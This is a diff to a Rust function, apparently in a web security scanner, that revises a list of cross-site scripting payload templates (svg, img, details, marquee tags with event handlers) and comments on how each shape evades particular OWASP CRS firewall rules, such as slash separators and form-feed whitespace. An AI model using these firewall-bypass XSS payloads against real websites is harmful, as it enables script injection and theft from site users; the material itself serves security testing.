@@ -69,13 +69,24 @@ pub(crate) fn get_dynamic_xss_html_payloads() -> Vec<String> {
             // SVG animate/set elements — may not be in CRS 941110 tag denylist
             "<svg><animate onbegin={JS} attributeName=x dur=1s class={CLASS}>",
             "<svg><set onbegin={JS} attributename=x to=1 class={CLASS}>",
-            // Slash-separated attributes — bypasses CRS 941160 regex expecting whitespace
-            "<svg/onload={JS}/class={CLASS}>",
-            "<img/src=x/onerror={JS}/class={CLASS}>",
-            "<details/open/ontoggle={JS}/class={CLASS}>",
-            // Exotic whitespace (form feed) — bypasses CRS 941320 \\s pattern
+            // Slash after the tag name — bypasses a WAF rule keying on whitespace
+            // immediately after the tag name (`<svg\s`). The `/` only separates
+            // attributes right after the tag name or after a *closed* value, so
+            // the remaining attributes stay space-separated: a fully
+            // `/`-separated form (`<svg/onload={JS}/class=…>`) would fold the
+            // trailing `/class=…` into the unquoted handler value, dropping the
+            // marker attribute so the payload could never DOM-verify. (Synthesis
+            // emits the fully space-free quoted-value slash shapes for the
+            // space-stripping-filter case; those carry their own quoting.)
+            "<svg/onload={JS} class={CLASS}>",
+            "<img/src=x onerror={JS} class={CLASS}>",
+            "<details/open ontoggle={JS} class={CLASS}>",
+            // Exotic whitespace (form feed, U+000C) — bypasses a CRS 941320 `\\s`
+            // pattern while still separating attributes (FF *is* HTML whitespace;
+            // a vertical tab U+000B is NOT, so it would merge the whole tag into
+            // one bogus name with no attributes).
             "<img\x0Csrc=x\x0Conerror={JS}\x0Cclass={CLASS}>",
-            "<svg\x0Bonload={JS}\x0Bclass={CLASS}>",
+            "<svg\x0Conload={JS}\x0Cclass={CLASS}>",
             // marquee with onstart (older browsers, rare in WAF denylists)
             "<marquee onstart={JS} class={CLASS}>",
             // Custom elements with tabindex+autofocus trick
